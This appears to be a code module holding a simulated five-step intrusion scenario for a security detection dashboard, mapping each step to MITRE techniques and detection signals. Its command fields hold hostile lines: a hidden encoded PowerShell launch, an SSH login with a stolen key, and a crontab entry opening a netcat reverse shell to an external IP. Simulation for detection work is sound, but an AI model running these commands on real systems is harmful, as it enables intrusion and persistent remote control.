export const ATTACK_SCENARIO_CHAIN = {
  id: "SCN-APT-01",
  name: "Windows Ingress -> C2 Beacon -> Ubuntu Lateral Movement",
  targetEnvironment: "Windows 11 Workstation & Ubuntu 22.04 Server",
  totalSteps: 5,
  steps: [
    {
      step: 1,
      title: "Initial Access — Spearphishing Attachment",
      phase: "Initial Access",
      mitre: "T1566.001",
      timestamp: "10:14:02",
      targetNodeId: "WIN-ENDPOINT-01",
      description: "User victim.user opens an invoice document with an embedded malicious payload on Windows workstation.",
      command: "EXCEL.EXE -> Invoice_Sept2026.xlsm",
      detectionSignal: "Baseline Email Gateway flagged unrecognized macro hash.",
      detectionType: "Heuristic",
      nodeUpdates: {
        "WIN-ENDPOINT-01": { status: "suspicious", riskScore: 45 }
      },
      edgeUpdates: {}
    },
    {
      step: 2,
      title: "Execution — Encoded PowerShell & Zero-Day Anomaly",
      phase: "Execution",
      mitre: "T1059.001",
      timestamp: "10:15:33",
      targetNodeId: "WIN-ENDPOINT-01",
      description: "Macro launches hidden PowerShell instance executing unquoted base64 memory injection.",
      command: "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Enc JABjAGwAaQBlAG4AdAAg...",
      detectionSignal: "Member 5 Zero-Day Model flagged anomalous parent-child execution (Score: 0.94).",
      detectionType: "ML Anomaly (Member 5)",
      nodeUpdates: {
        "WIN-ENDPOINT-01": { status: "compromised", riskScore: 78 }
      },
      edgeUpdates: {}
    },
    {
      step: 3,
      title: "Command & Control — Beacon to Malicious External IP",
      phase: "Command and Control",
      mitre: "T1071.001",
      timestamp: "10:16:48",
      targetNodeId: "ATTACKER-EXT",
      description: "WIN-ENDPOINT-01 establishes recurring HTTPS beaconing session to 185.220.101.5 on port 443.",
      command: "SYN to 185.220.101.5:443 | Payload: TLS Handshake / C2 Beacon Heartbeat (15s jitter)",
      detectionSignal: "Member 2 Threat Intel matched 185.220.101.5 in AbuseIPDB & OTX (Reputation: 92/100, Malicious).",
      detectionType: "IOC Match (Member 2)",
      nodeUpdates: {
        "WIN-ENDPOINT-01": { status: "compromised", riskScore: 94 }
      },
      edgeUpdates: {
        "e1": { status: "active" }
      }
    },
    {
      step: 4,
      title: "Lateral Movement — SSH Pivot from Windows to Ubuntu",
      phase: "Lateral Movement",
      mitre: "T1021.004",
      timestamp: "10:18:15",
      targetNodeId: "UBUNTU-SRV-01",
      description: "Attacker harvests cached SSH private key from Windows endpoint and logs into Ubuntu server (10.20.10.50:22).",
      command: "ssh -i /Users/victim.user/.ssh/id_rsa ubuntu-admin@10.20.10.50 'uname -a; whoami'",
      detectionSignal: "Member 7 SIEM correlated cross-platform lateral jump from workstation to critical Ubuntu server.",
      detectionType: "SIEM Correlation",
      nodeUpdates: {
        "UBUNTU-SRV-01": { status: "compromised", riskScore: 88 }
      },
      edgeUpdates: {
        "e2": { status: "active" }
      }
    },
    {
      step: 5,
      title: "Privilege Escalation & Persistence on Ubuntu Server",
      phase: "Persistence & Privilege Escalation",
      mitre: "T1548.003",
      timestamp: "10:20:00",
      targetNodeId: "UBUNTU-SRV-01",
      description: "Attacker abuses sudo NOPASSWD misconfiguration to spawn root shell and installs cron persistence.",
      command: "sudo -u root bash -c 'echo \"* * * * * root /bin/nc -e /bin/sh 185.220.101.5 4444\" >> /etc/crontab'",
      detectionSignal: "High-severity Linux auditd alert: /etc/crontab modified by non-standard interactive root shell.",
      detectionType: "Linux Host Audit",
      nodeUpdates: {
        "UBUNTU-SRV-01": { status: "compromised", riskScore: 97 }
      },
      edgeUpdates: {}
    }
  ]
};
